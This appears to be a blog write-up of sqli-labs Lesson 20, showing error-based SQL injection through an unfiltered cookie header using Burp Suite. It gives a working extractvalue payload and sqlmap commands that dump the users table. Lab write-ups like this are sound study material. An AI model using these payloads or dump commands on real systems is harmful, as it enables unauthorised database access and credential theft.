---
title: sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入
date: 2018-09-29 20:34:34
tags:
categories: sql注入
---
# sqli-labs lession 20 POST基于错误的Cookie-Uagent字段数据头注入 #

## 登录界面 ##

![1](\img\sql\Lesson-20\1.png)

## 分析 ##

不出所料账号密码被过滤了。

![2](\img\sql\Lesson-20\2.png)

用admin,admin登录成功,页面返回信息。

![3](\img\sql\Lesson-20\3.png)

这次页面拿了一堆信息。


从源码用可以得知登录成功后会保存用户登录名到cookie中,存活时间为1小时。再次刷新时会从数据库查询用户名等于cookie的数据,而cookie在SQL执行前没有过滤。这里得用Burpsuite做了。

![4](\img\sql\Lesson-20\4.png)

关闭phpstudy的magic_quotes_gpc配置,否则cookie数据中的特殊符号会被转义导致实验失败。

![5](\img\sql\Lesson-20\5.png)

## 注入 ##

首先以正确的用户账号登录

![6](\img\sql\Lesson-20\6.png)

然后开启firefox代理,用Burpsuite拦截包。刷新页面。

![7](\img\sql\Lesson-20\7.png)

截取到服务器请求获取cookie的包,发送到Repeater。

![8](\img\sql\Lesson-20\8.png)

修改`Cookie: uname=admin`为`Cookie: uname=admin'`,点击GO发送,查看归还界面。

![9](\img\sql\Lesson-20\9.png)

有报错信息后根据报错信息构造闭合,payload也呼之欲出。

![10](\img\sql\Lesson-20\10.png)

`Cookie: uname=admin' and extractvalue(null,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = 'users'),0x7e))#`

![11](\img\sql\Lesson-20\11.png)

## SQLMAP ##

用Burpsuite抓取刷新页面的包,能够获得cookie信息。保存到文件。

![12](\img\sql\Lesson-20\12.png)

-r 指定HTTP请求报文

--level 2:加入检测cookie

--dbms mysql:指定后端数据库为mysql

--technique E:指定测试方式为报错注入

--thread 10:指定并发线程

`sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10 `

![13](\img\sql\Lesson-20\13.png)

`sqlmap -r sqlpost/post_20.txt --level 2 --dbms mysql --technique E --threads 10 -D security -T users --columns --dump`

![14](\img\sql\Lesson-20\14.png)